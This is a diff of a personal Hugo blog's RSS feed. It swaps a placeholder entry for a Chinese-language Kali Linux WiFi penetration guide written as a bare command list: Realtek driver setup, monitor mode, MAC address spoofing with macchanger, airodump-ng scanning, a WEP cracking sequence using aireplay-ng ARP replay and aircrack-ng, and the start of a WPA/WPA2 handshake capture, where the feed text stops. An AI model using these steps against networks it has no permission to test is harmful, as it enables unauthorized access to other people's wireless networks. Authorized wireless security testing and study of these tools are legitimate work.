@@ -10,15 +10,44 @@
       <link>https://1i4n.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- 0.147.3</generator>
-    <language>en</language>
+    <language>zh</language>
     <lastBuildDate>Sat, 15 Mar 2025 11:30:03 +0000</lastBuildDate>
     <atom:link href="https://1i4n.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>wifi_test</title>
+      <title>WIFI_test</title>
       <link>https://1i4n.github.io/posts/wifi/</link>
       <pubDate>Sat, 15 Mar 2025 11:30:03 +0000</pubDate>
       <guid>https://1i4n.github.io/posts/wifi/</guid>
-      <description>Desc Text.</description>
+      <description>&lt;h1 id=&#34;kali-linux-wifi渗透指南-8812au驱动&#34;&gt;Kali Linux WiFi渗透指南 (8812AU驱动)&lt;/h1&gt;
+&lt;h2 id=&#34;驱动安装步骤&#34;&gt;驱动安装步骤&lt;/h2&gt;
+&lt;h3 id=&#34;1安装内核头文件&#34;&gt;1.安装内核头文件&lt;/h3&gt;
+&lt;p&gt;apt install linux-headers-$(uname -r)&lt;/p&gt;
+&lt;h3 id=&#34;2搜索可用头文件版本&#34;&gt;2.搜索可用头文件版本&lt;/h3&gt;
+&lt;p&gt;apt-cache search linux-headers&lt;/p&gt;
+&lt;h3 id=&#34;3安装realtek驱动&#34;&gt;3.安装Realtek驱动&lt;/h3&gt;
+&lt;p&gt;sudo apt install realtek-rtl88xxau-dkms&lt;/p&gt;
+&lt;h2 id=&#34;开启监听模式注意接口名称&#34;&gt;开启监听模式（注意接口名称）&lt;/h2&gt;
+&lt;p&gt;airmon-ng start wlan0&lt;/p&gt;
+&lt;h2 id=&#34;验证接口状态成功后应为wlan0mon&#34;&gt;验证接口状态（成功后应为wlan0mon）&lt;/h2&gt;
+&lt;p&gt;iwconfig
+通用配置技巧&lt;/p&gt;
+&lt;h3 id=&#34;mac地址欺骗建议在监听前操作&#34;&gt;MAC地址欺骗（建议在监听前操作）&lt;/h3&gt;
+&lt;p&gt;ifconfig wlan0 down
+macchanger -m 38:FC:98:6B:CE:57 wlan0&lt;/p&gt;
+&lt;h2 id=&#34;扫描24g频段&#34;&gt;扫描2.4G频段&lt;/h2&gt;
+&lt;p&gt;airodump-ng wlan0mon&lt;/p&gt;
+&lt;h2 id=&#34;扫描5g频段指定频率范围&#34;&gt;扫描5G频段（指定频率范围）&lt;/h2&gt;
+&lt;p&gt;airodump-ng -C 5180-5880 wlan0mon
+airodump-ng -c [信道] -w wep_capture &amp;ndash;bssid [目标BSSID] wlan0mon&lt;/p&gt;
+&lt;h3 id=&#34;arp请求重放攻击&#34;&gt;ARP请求重放攻击&lt;/h3&gt;
+&lt;p&gt;aireplay-ng -3 -b [BSSID] -h [伪造MAC] wlan0mon&lt;/p&gt;
+&lt;h3 id=&#34;或主动攻击强制生成数据包&#34;&gt;或主动攻击（强制生成数据包）&lt;/h3&gt;
+&lt;p&gt;aireplay-ng -9 -b [BSSID] wlan0mon&lt;/p&gt;
+&lt;h3 id=&#34;当ivs达到20000时执行&#34;&gt;当IVs达到20000+时执行&lt;/h3&gt;
+&lt;p&gt;aircrack-ng -b [BSSID] wep_capture-01.cap&lt;/p&gt;
+&lt;h2 id=&#34;wpawpa2破解流程&#34;&gt;WPA/WPA2破解流程&lt;/h2&gt;
+&lt;h3 id=&#34;捕获握手包&#34;&gt;捕获握手包&lt;/h3&gt;
+&lt;p&gt;airodump-ng -c [信道] -w wpa_capture &amp;ndash;bssid [目标BSSID] wlan0mon&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
